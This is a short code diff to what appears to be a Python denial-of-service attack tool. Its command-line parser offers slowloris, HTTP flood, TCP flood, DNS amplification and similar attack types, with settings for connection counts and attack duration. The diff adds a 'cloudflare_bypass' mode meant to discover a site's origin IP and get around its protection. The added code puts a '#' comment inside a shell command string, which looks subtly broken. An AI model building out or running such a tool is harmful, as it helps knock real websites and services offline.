@@ -3131,7 +3131,7 @@ def main():
     parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
     parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
     parser.add_argument("--path", default="/", help="Target path (default: /)")
-    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "slow_read", "http_flood", "ssl_exhaust", "tcp_flood", "land", "dns_amplification"], default="slowloris", help="Attack type")
+    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "slow_read", "http_flood", "ssl_exhaust", "tcp_flood", "land", "dns_amplification", "cloudflare_bypass"], default="slowloris", help="Attack type")
     parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
     parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
     parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
@@ -4005,6 +4005,9 @@ class AttackManager:
             if target_ip:
                 safe_target_ip = shlex.quote(target_ip)
                 cmd += f"--target-ip {safe_target_ip} "
+            if attack_type == "cloudflare_bypass":
+               # Cloudflare Bypass attack - no special parameters needed
+               cmd += "# Cloudflare Bypass: will attempt to discover origin IP and bypass protection "
         
         # Redirect output to log file and run in background
         timestamp = int(time.time())
